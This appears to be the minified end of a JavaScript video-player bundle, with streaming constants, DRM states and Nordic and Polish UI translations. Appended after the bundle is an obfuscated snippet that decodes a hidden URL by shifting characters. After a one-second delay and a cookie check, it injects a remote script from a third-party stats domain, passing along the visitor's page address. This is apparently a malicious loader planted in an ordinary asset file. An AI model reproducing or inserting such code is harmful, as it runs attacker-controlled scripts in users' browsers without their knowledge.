YBACK_SEEKING_CORRECTION=2,gc.DRM_LICENSE_CHECK_MECHANISM_TIMEOUT=2e4,gc.DASH_CUSTOM_SETTINGS_KEY="dashSettings",gc.DASH_LOW_END_DEVICES_SETTINGS_KEY="lowEndDevicesSettings",gc.DASH_DAI_ADS_MAXQUALITY_SCALING_RATIO_KEY="daiAdsMaxQualityScalingRatio",gc.DRM_DEFAULT_ROBUSTNESS_LEVEL="SW_SECURE_CRYPTO",gc.SYSTEM_73_KEY="system73",gc.STREAM_DURATION_SAFE_WINDOW=.5,gc.STREAM_COMPLETE_WATCHDOG_TIMEOUT=1e3,gc.STREAM_BUFFERING_WATCHDOG_TIMEOUT=22e3,gc.SEEKING_OVER_VIDEO_GAP_METER_PERIOD=4,gc.SEEKING_OVER_VIDEO_GAP_METER_MAX_LOAD=4,gc.THRESHOLD_FOR_INITIAL_GARBAGE_CT=.1,gc.instances=new Jb,tc.LIVE_STREAM_ON_ERROR_MAX_RESTARTS=5,tc.LIVE_STREAM_ON_ERROR_RESTART_TIMEOUT=1e4,tc.LIVE_STREAM_ON_ERROR_FALLBACK_RETRY_BASE_DELAY=2e3,tc.LIVE_STREAM_DISABLE_DVR_DURATION=1,tc.LIVE_STREAM_DVR_MIN_LEN=600,tc.LIVE_STREAM_DVR_MIN_LEN_KEY="liveStreamDvrMinLen",tc.QUALITY_LEVEL_AUTO="-1",tc.QUALITY_LABEL_TYPE_BITRATE="bitrate",tc.QUALITY_LABEL_TYPE_RESOLUTION="resolution",tc.QUALITY_LABEL_TYPE_VARIABLES_KEY="qualityLabelType",tc.DURRATION_MIN_DIFF_FOR_PRE_PLAYBACK_SEEKING_CORRECTION=2,tc.SKIP_MISSING_TAIL_SEGMENT_MAX_DURATION=.15,tc.HASPLAYER_SETTINGS_INITIAL_QUALITY_KEY="ABR.initialQualityKbs",tc.SYSTEM_73_KEY="system73",tc.EDGE_UNFREEZE_SAFETY_WINDOW=2e3,tc.EDGE_UNFREEZE_OFFSET=.2,tc.EDGE_UNFREEZE_STEPS_DELAY=100,tc.STATE_GENERAL_PLAYBACK=0,tc.STATE_DELAY_FOR_RESTART=10,tc.STATE_RESTARTING=11,tc.STATE_LIVE_STREAM_ENDING=20,tc.STATE_LIVE_STREAM_ENDED=21,tc.STATE_VOD_CORRUPTED_STREAM_ENDING=25,tc.STATE_ERROR=30,tc.instances=new Jb,Pb.LIVE_STREAM_ON_ERROR_RESTART_TIMEOUT=1e4,Pb.LIVE_STREAM_ON_ERROR_FALLBACK_RETRY_BASE_DELAY=2e3,Pb.DELAY_FOR_AUDIO_TRACK_CHANGE=100,Pb.DURRATION_MIN_DIFF_FOR_PRE_PLAYBACK_SEEKING_CORRECTION=2,Pb.MIN_START_POINT_DIFF_FOR_CORRECTION=1,Pb.ANDROID_START_PLAYBACK_TIMOUT=7e3,Pb.ANDROID_PLAYBACK_STALL_TIMEOUT=1e3,Pb.PLAYBACK_END_SAFETY_WINDOW=1,Pb.IOS_STALLED_BROKEN_CONNECTION_OUT_OF_BUFFER=5e3,Pb.IOS_STALLED_BROKEN_CONNECTION_OUT_OF_BUFFER_ADS=25e3,Pb.IOS_DELAY_INITIALIZATION_PLAYBACK_BLOCK=500,Pb.IOS_HIT_DECODER_AFTER_AD_BREAK=.5,Pb.IOS_15_MEDIA_ERR_DECODE_DELAY=2e3,Pb.MOBILE_OR_SAFARI_BUFFERING_NO_DATA_TIMEOUT=14e3,Pb.ON_ERROR_FALLBACK_MAX_TRIES_NUM=3,Pb.ON_ERROR_FALLBACK_MAX_TRIES_NUM_FOR_LIVE_STREAMS=5,Pb.ON_ERROR_FALLBACK_RETRY_BASE_DELAY=1e3,Pb.STATE_INIT_INITIALIZATION=0,Pb.STATE_INIT_DRM_FP_INIT=10,Pb.STATE_INIT_DRM_FP_CERT=11,Pb.STATE_INIT_DRM_FP_KEY_SESSION_INIT=12,Pb.STATE_INIT_DRM_FP_LA_WAITING=13,Pb.STATE_INIT_DRM_FP_LA=14,Pb.STATE_INIT_DRM_FP_KEY_ADDED=15,Pb.STATE_INIT_DRM_TIMEOUT=20,Pb.STATE_PLAYBACK_LOADING=101,Pb.STATE_PLAYBACK_PAUSED=102,Pb.STATE_PLAYBACK_PLAYING=103,Pb.STATE_DELAY_FOR_RESTART=150,Pb.STATE_LIVE_STREAM_ENDING=180,Pb.STATE_ENDED_CONTENT_FINISH=200,Pb.STATE_ENDED_ERROR_OCCURRED=210,Pb.COMMAND_PLAY=1,Pb.COMMAND_PAUSE=2,Pb.COMMAND_PLAY_PAUSE_TOGGLE=3,Pb.LIVE_EVENT_DEFAULT_LIVE_EDGE_OFFSET=15,Pb.canPlayFileExtensionCache=new Jb,Pb.instances=new Jb,Pb.subtitlesStylesForSafariInitialized=!1,Ze.INITIALIZATION_STEP_TIMEOUT=3e4,$e.ATTRIBUTE_WIDTH="data-bs-width",$e.ATTRIBUTE_HEIGHT="data-bs-height",se.DEFAULT_SAMPLES_NUM=2,se.EXPECTED_SAMPLES_PER_SEC=2,se.MIN_TIME_DIFF_FOR_RECORD=.05,hd.SESSION_STORAGE_VOLUME_PRECISTION=3,hd.SESSION_STORAGE_KEY_VOLUME="_brplayer_vol",hd.SESSION_STORAGE_KEY_AUDIO="_brplayer_aud_lang",hd.SESSION_STORAGE_KEY_SUBTITLES="_brplayer_sub_lang",Yb.DEFAULT_LOCALE="en",Yb.translationsJson={sv:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Kanaler",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Textning",embed_code_copy:"copy to clipboard",live_tv:"Kanaler",season:"Ssong",embed_code_info:"press Ctrl+C to copy",video_quality:"Videokvalitt",language:"Sprk",episode:"Avsnitt",warning:"Varning",advertisement_bar_title:"Reklam",advertisement_skip_label:"Hoppa ver annonsen",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"Programmet startar direkt efter annons pausen:",error:"Error"},en:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Channels",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Subtitles",embed_code_copy:"copy to clipboard",live_tv:"Live TV",season:"Season",embed_code_info:"press Ctrl+C to copy",video_quality:"Video quality",language:"Language",episode:"Episode",warning:"Warning",advertisement_bar_title:"Advertising",advertisement_skip_label:"Skip ad",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"The program starts right after the ad-break:",error:"Error"},da:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Kanaler",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Undertekster",embed_code_copy:"copy to clipboard",live_tv:"Kanaler",season:"Sson",embed_code_info:"press Ctrl+C to copy",video_quality:"Videokvalitet",language:"Sprog",episode:"Episode",warning:"Advarsel",advertisement_bar_title:"Reklame",advertisement_skip_label:"Spring annoncen over",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"Programmet starter lige efter annoncepausen:",error:"Error"},no:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Kanaler",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Undertekst",embed_code_copy:"copy to clipboard",live_tv:"Direkte-TV",season:"Sesong",embed_code_info:"press Ctrl+C to copy",video_quality:"Video kvalitet",language:"Sprk",episode:"Episode",warning:"Advarsel",advertisement_bar_title:"Reklame",advertisement_skip_label:"Hoppe over annonsend",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"Programmet starter rett etter annonse-pausen:",error:"Error"},fi:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Kanavat",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Tekstitykset",embed_code_copy:"copy to clipboard",live_tv:"Live-TV",season:"Kausi",embed_code_info:"press Ctrl+C to copy",video_quality:"Videon laatu",language:"Kieli",episode:"Jakso",warning:"Varoitus",advertisement_bar_title:"Mainonta",advertisement_skip_label:"Ohita mainos",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"Ohjelma kynnistyy heti mainoskatkon jlkeen:",error:"Error"},pl:{connection_error_permanent:"Brak poczenia z serwerem. Link do strumienia jest uszkodzony lub co blokuje komunikacj midzy przegldark a serwerem.",channels:"Programy",embed_code:"Embed code",subtitles:"Napisy",embed_code_copy:"kopiuj do schowka",live_tv:"Na ywo",season:"Sezon",embed_code_info:"nacinij Ctrl+C, aby skopiowa",video_quality:"Jako",language:"Jzyk",episode:"Epizod",warning:"Uwaga",advertisement_bar_title:"Reklama",advertisement_skip_label:"Pomi reklam",connection_error:"Utracono poczenie z serwerem. Sprawd poczenie internetowe i kliknik przycisk 'Pocz'.",details:"Szczegy",try_again:"Pocz",advertisement_title_on_progressbar:"Program rozpocznie si zaraz po reklamach:",error:"Bd",cannot_load_media:"Odtwarzacz nie mg zdekodowa dostarczonego wideo. Wideo moe by uszkodzone lub twoja przegldarka nie wspiera dostarczonego formatu wideo."},default:{connection_error_permanent:"There is no connection with server. Link to stream is broken or something is blocking communication between your browser and server.",channels:"Channels",embed_code:"Embed code",cannot_decode_media:"Player is not able to decode provided media. Video can be broken or your browser doesn't support such video format.",subtitles:"Subtitles",embed_code_copy:"copy to clipboard",live_tv:"Live TV",season:"Season",embed_code_info:"press Ctrl+C to copy",video_quality:"Video quality",language:"Language",episode:"Episode",warning:"Warning",advertisement_bar_title:"Advertising",advertisement_skip_label:"Skip ad",connection_error:"Connection to server lost. Please check your internet connection and click 'Try again' button.",details:"Details",try_again:"Try again",advertisement_title_on_progressbar:"The program starts right after the ad-break:",error:"Error"}},Yb.locale="en",Vc.tweens=new te,Tc.UID_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",nc.FORMAT_HLS="hls",nc.FORMAT_MS_SMOOTH_STREAMING="mss",nc.FORMAT_MPEG_DASH="dash",nc.FORMAT_FILE="file",nc.FORMAT_UNKNOWN="-",nc.skipQueryParamsAndHashAncorRegex=new u("[\\?#].*","g"),nc.fallbackSkipSemicolonRegex=new u("[;].*","g"),nd.CHARS="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",nd.BYTES=Uc.ofString(nd.CHARS),Jd.escapes=(b=this,(b=new Jb).h.lt="<",b.h.gt=">",b.h.amp="&",b.h.quot='"',b.h.apos="'",b),F.main()}("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this),jb!==bradmax&&(jb.bradmax=bradmax)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));